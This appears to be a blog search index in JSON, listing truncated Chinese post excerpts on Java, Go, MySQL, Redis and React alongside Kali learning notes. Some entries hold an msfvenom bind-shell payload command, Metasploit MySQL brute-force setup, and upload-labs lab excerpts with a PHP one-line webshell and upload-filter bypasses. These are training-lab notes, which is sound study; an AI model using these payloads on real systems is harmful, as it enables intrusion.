示例","lvl0":"man的正确使用方法","lvl1":null,"lvl2":"摘要","objectID":"440c9cd4b0b88c0e9fa90b2a869c7b17","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/man-%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/"},{"content":"maven 传递依赖 相关参考博客","lvl0":"maven传递依赖","lvl1":null,"lvl2":"摘要","objectID":"2db12bcaa25df9026d4695e815d5103d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/maven%E7%9B%B8%E5%85%B3/"},{"content":"MSF提权 win的教程 学习视频 先生成木马文件 1 2 msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b \u0026#39;\\x00\u0026#39; -i 3 -f python 上面的各参数分别是 -a 目标主机为32位的架构 –platform 系","lvl0":"MSF提权的教程记录","lvl1":null,"lvl2":"摘要","objectID":"cc524c0dd123fc04f3a9fa41c83eb5ab","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/msf%E6%8F%90%E6%9D%83%E7%9A%84%E6%95%99%E7%A8%8B%E8%AE%B0%E5%BD%95/"},{"content":"Mutex 使用 Mutex 是使用最广泛的同步原语（Synchronization primitives，有人也叫做并发原语。我们在这个课程中根据英文直译优先用同","lvl0":"Mutex","lvl1":null,"lvl2":"摘要","objectID":"dccc23dc106094f8228004b3d1a875e1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/mutex/"},{"content":"MySQL 数据库开发的三十六条军规 一、核心军规(5) 1.1 尽量不在数据库做运算 别让脚趾头想事情，那是脑瓜子的职责 让数据库多做她擅长的事: 尽量不在数据库做","lvl0":"mysql开发注意事项","lvl1":null,"lvl2":"摘要","objectID":"f288881cc4176f79c005bdd25336826f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/mysql%E5%BC%80%E5%8F%91%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"},{"content":"先初始化 1 2 3 4 5 6 7 8 9 10 11 service postgresql start msfdb init # 如果数据库错误 msfdb reinit # 先执行第一条，开启 postgresql msfdb run msfconsole 开始 mysql爆破 局域网ip : 10.218.30.50 端口 3306 开始 使用 1 2 3","lvl0":"mysql服务爆破实战","lvl1":null,"lvl2":"摘要","objectID":"8f6def393ba60e2f1105f45675669df8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/mysql%E6%9C%8D%E5%8A%A1%E7%88%86%E7%A0%B4%E5%AE%9E%E6%88%98/"},{"content":"mysql慢查询怎么优化 检查是否走了索引，如果没有，优化 SQL 利用索引 检查 利用的索引是否是最优索引，没有的话，尽量用最优索引 检查所查字段是否是必","lvl0":"mysql相关","lvl1":null,"lvl2":"摘要","objectID":"2826c10a4722271e7b01415ca51a2454","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/mysql%E7%9B%B8%E5%85%B3/"},{"content":"mysql 索引原理 什么是回表 回表的概念，去根据索引搜索到 数据，但是索引中没有要查找的数据，就要去定位到那个行，去把数据行中的数据搜索出来【这个就是回","lvl0":"mysql索引原理","lvl1":null,"lvl2":"摘要","objectID":"f1873330c6d84b0ee625afd194a644d2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/mysql-%E7%B4%A2%E5%BC%95/"},{"content":"neo4j 基本概念 参考学习教程 neo4j的数据模型 neo4j cql 图数据库 通过apache lucene 索引 支持unique 约束 包含一个用于执行 cql 命令的 UI： NEO4J 数据库浏览器","lvl0":"neo4j基本概念","lvl1":null,"lvl2":"摘要","objectID":"6262d4c80cc20f6148102308374233ef","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/neo4j/neo4j%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"},{"content":"NIO 的应用 BIO 这种线程模型适用于 socket 连接不是很多的场景；但是现在的互联网场景，往往需要服务器能够支撑十万甚至百万连接，而创建十万甚至上百万个线程显","lvl0":"Netty框架原理剖析","lvl1":null,"lvl2":"摘要","objectID":"40c86837de0139824a78c8f813bb27b6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/netty%E4%BA%86%E8%A7%A3/"},{"content":"NIO原理 设置一个场景， 从 socket里面读取数据，读到 \u0026lsquo;\\n\u0026rsquo; 为止，把读到的数据写入到另一个 socket里面，这个就是 c 和 java nio的2种实现 ne","lvl0":"netty线程模型【nio-reactor】","lvl1":null,"lvl2":"摘要","objectID":"939c428456c62c94689d7ba9b4fa7804","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/netty-%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8Bnio-reactor%E6%A8%A1%E5%9E%8B/"},{"content":"nj模板引擎 学习教程 官网地址 1 2 3 4 5 6 7 8 //配置模板引擎 config.view = { defaultExtension:\u0026#39;.nj\u0026#39;, defaultViewEngine:\u0026#39;nunjucks\u0026#39;, }","lvl0":"nj模板引擎","lvl1":null,"lvl2":"摘要","objectID":"97de03c40a564baa12cefc4676b230ff","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/nodejs/nj%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/"},{"content":"nmap工具原理 1 nmap扫描主要有 TCP 全连接扫描（会被扫描机器留下记录）， 半连接扫描（不会留下记录） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 :\u0026lt;\u0026lt;EOF SCAN TECHNIQUES:","lvl0":"nmap工具使用","lvl1":null,"lvl2":"摘要","objectID":"a7e0d143de130f235816db78d2a92242","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/nmap%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86/"},{"content":"ljudge框架 https://github.com/quark-zju/ljudge","lvl0":"nodejs调用服务器命令脚本","lvl1":null,"lvl2":"摘要","objectID":"3cca5632c1c02766b6d30ac7e86c5d40","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/nodejs/nodejs-%E8%B0%83%E7%94%A8-python%E8%84%9A%E6%9C%AC/"},{"content":"安装OJ 环境的过程 安装的文档 2.1、安装安全计算模型 libseccomp RunC 默认的编译配置是支持 seccomp 的，所以我们需要先安装libseccomp, 如果是centos","lvl0":"OJ 环境安装","lvl1":null,"lvl2":"摘要","objectID":"36d37b47fa296bf806de5122c9bc0933","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/oj%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"},{"content":"Once使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; ) func main() { var once sync.Once // 第一个初始化函数 f1 := func() { fmt.Println(\u0026#34;in f1\u0026#34;) } once.Do(f1) // 打印出 in f1 // 第二个初始化函数 f2","lvl0":"Once 单例对象初始化","lvl1":null,"lvl2":"摘要","objectID":"d8a5e8d62de4a4eb510f96920d124af3","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/once/"},{"content":"upload-labs 01 学习 1 2 \u0026lt;?php eval($_POST[cmd]) ?\u0026gt; 将 webshell.php 改为 webshell.php.jpg 右键 将findler软件 unlock for editing 允许修改请求头 rules -\u0026gt; breakpoints -\u0026gt; before request 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ------WebKitFormBoundaryxOVc8BMvlOWwyrBX Content-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;webshell.php\u0026#34; Content-Type: image/jpeg \u0026lt;?php eval($_POST[cmd]) ?\u0026gt; ------WebKitFormBoundaryxOVc8BMvlOWwyrBX Content-Disposition: form-data; name=\u0026#34;submit\u0026#34;","lvl0":"pass-01","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"6725d511c62e4ec42dca840e8ec84217","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-01/"},{"content":"分析源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/jpeg\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/png\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/gif\u0026#39;)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; . $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg =","lvl0":"pass-02 【修改请求头】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"0d107860e8eea1856491fb25a7300ea1","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-02/"},{"content":"黑名单绕过 .htaccess 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.php1\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.pHp1\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_nam","lvl0":"pass-02 【修改请求头】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"58a5f80a2c27c4d9b1ebe7c24e76ad87","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-04/"},{"content":"文件后缀名检查绕过 只是定义了 .php 的黑名单，我们可以发送 .php3文件后缀绕过 黑名单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $is_upload =","lvl0":"pass-03 【php3绕过黑名单】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"cee60b8167b55688aa7ed28610442beb","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-03/"},{"content":"大小写绕过漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_nam","lvl0":"pass-06 【大小写绕过漏洞】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"915b5fbedab7f307fc94dc4275fb6a3b","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-06/"},{"content":"参考博客 十进制转二进制 1 2 3 PS D:\\ASUS\\Desktop\u0026gt; [System.Convert]::ToString(224,2) 11100000 N进制转十进制 1 2 PS D:\\ASUS\\Desktop\u0026gt; [System.Convert]::ToInt32(24,8) 20","lvl0":"powershell常用计算","lvl1":null,"lvl2":"摘要","objectID":"449ceab246723cfb07894f390519db14","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/bat%E8%84%9A%E6%9C%AC/powershell%E5%B8%B8%E7%94%A8%E8%AE%A1%E7%AE%97/"},{"content":"python 脚本总结 python判题程序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55","lvl0":"python实现判题程序","lvl1":null,"lvl2":"摘要","objectID":"46e15b87aafd339ac76a417dbfae58db","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E9%A1%B9%E7%9B%AE%E8%84%9A%E6%9C%AC/python%E5%AE%9E%E7%8E%B0%E5%88%A4%E9%A2%98%E7%A8%8B%E5%BA%8F/"},{"content":"几款 MQ 的性能对比 ActiveMQ: JMS 规范 (java 定义的规范)，支持事务，支持XA 协议（支持事务消息）， 没有生成大规模支撑场景，官方文档维护越来越少 RabbitMQ : erlang 语言开发，","lvl0":"rabbitMQ 、Kafka、ActiveMq 等","lvl1":["八股文"],"lvl2":"摘要","objectID":"828ef0cda28960450cb7c7a889795ef6","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/mq/kafaka-activemqrabbitrocketmq/"},{"content":"","lvl0":"rabbitMQ 镜像队列","lvl1":["八股文"],"lvl2":"摘要","objectID":"fc1c4f7cb99626eac5214f2e28537ba2","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/mq/rabbitmq-%E9%95%9C%E5%83%8F%E9%98%9F%E5%88%97/"},{"content":"react 代码配置笔记 next 安装 ant-design 过程 1 2 3 4 5 6 7 8 9 10 yarn add @zeit/next-css # 安装 可以在 react 上写 css的框架 yarn add antd # 安装 ant-design yarn add babel-plugin-import # 安装 babel 按需加载 1 2 3 4 5 6 7 8 9 10 11","lvl0":"react配置记录","lvl1":null,"lvl2":"摘要","objectID":"0a9547f2a248845a29230587462e51b1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/%E9%85%8D%E7%BD%AE/"},{"content":"以下为redis.conf的文件的中文描述，整理于网络 1 2 3 4 5 6 7 8 9 10 11 12 # Redis 配置文件示例 # 注意单位: 当需要配置内存大小时, 可能需要指定","lvl0":"redis conf 配置","lvl1":null,"lvl2":"摘要","objectID":"a375297cfcfdb800215f942e4fcd0508","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-conf-cn/"},{"content":"redis rdb 和 aof 机制 rdb: redis database 在指定时间内将内存中的数据集快照写入磁盘，实际操作过程就是一个 fork 一个子进程，先将数据写入临时文件，写入成功 后再替换之前的文","lvl0":"redis rdb 和 aof机制","lvl1":["八股文"],"lvl2":"摘要","objectID":"94f518490ac6e2ef5452528d83fb86eb","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/redis/redis_rdb_aof%E6%9C%BA%E5%88%B6/"},{"content":"1. redis是什么？（what） Redis是一个开源（BSD许可），内存存储的数据结构服务器，可用作数据库，高速缓存和消息队列代理。它支持字","lvl0":"redis介绍","lvl1":null,"lvl2":"摘要","objectID":"c1a407f096a746a4f5de722f250ab2bf","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-introduction/"},{"content":"1. 部署Redis集群 redis的安装及配置参考[redis部署] 本文以创建一主二从的集群为例。 1.1 部署与配置 先创建sentinel目录，在该目","lvl0":"redis哨兵集群使用","lvl1":null,"lvl2":"摘要","objectID":"e202cb5fc7e97298ac197d3a97d3b30f","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-sentinel/"},{"content":"redis 为什么最大 512M redis中用int来修饰len字段，int为4个字节，也就是32位，那么最大能表示 $2^32$ 次方。所以2^32/8/1024/102","lvl0":"redis数据结构","lvl1":null,"lvl2":"摘要","objectID":"04d92150ce8516b36d4fefcc94918f61","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/redis%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"1. Redis部署 以下以Linux系统为例 1.1 下载和编译 1 2 3 4 $ wget http://download.redis.io/releases/redis-4.0.7.tar.gz $ tar xzf redis-4.0.7.tar.gz $ cd redis-4.0.7 $ make 编译完成后会在src目录下生成Redis服务端程序red","lvl0":"redis部署过程","lvl1":null,"lvl2":"摘要","objectID":"4f2d8e177542ad7d01da7de86a5308dd","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-cluster/"},{"content":"本文来自redis 官方配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Redis configuration file example. # # Note that in order to read the configuration file, Redis must be # started with the file path as first argument: # # ./redis-server /path/to/redis.conf # Note on units: when","lvl0":"redis配置 英文版","lvl1":null,"lvl2":"摘要","objectID":"76227d70e5d76107db7f17ccc6c706a3","tags":["redis"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/redis/redis-conf-en/"},{"content":"rwlock 这一类并发读写问题叫作  readers-writers 问题，意思就是，同时可能有多个读或者多个 写，但是只要有一个线程在执行写操作，其它的线程都不能执行读写操作。 RWMutex 的方","lvl0":"RWMutex","lvl1":null,"lvl2":"摘要","objectID":"78da63d6d65c7024e2ceaca713cbeaa8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/rwmutex/"},{"content":"wrap.c源码学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60","lvl0":"select 、poll api学习","lvl1":null,"lvl2":"摘要","objectID":"e297aeaf68e0c44f4da442dfe0f2ed9e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/select-api/"},{"content":"semaphore原理 信号量的概念是荷兰计算机科学家 Edsger Dijkstra 在 1963 年左右提出来的，广泛应用在 不同的操作系统中。在系统中，会给每一个进程一个信号量，","lvl0":"semaphore","lvl1":null,"lvl2":"摘要","objectID":"c2fe1e0245d94d04e695247aee4111e4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/semaphore/"},{"content":"信号量的使用方法 我的共享资源有多个， 需要限制同时访问共享资源的线程上限","lvl0":"semaphore_信号量","lvl1":null,"lvl2":"摘要","objectID":"613f19fa34b3d4aaa972a2a448792729","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/semaphore_%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"content":"1. 字符串 字符串是shell编程中最常用最有用的数据类型（除了数字和字符串，也没啥其它类型好用了），字符串可以用单引号，也可以用双引号，也可以","lvl0":"shell-array","lvl1":null,"lvl2":"摘要","objectID":"fbdd4190f618287031fc363e84ccd57f","tags":["shell命令学习","shell指令"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/shell%E5%91%BD%E4%BB%A4%E7%BB%86%E5%88%86/shell-array/"},{"content":"cut 命令 cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。 如果不指定 File 参数，cut 命令将读取标准输入。必须指定 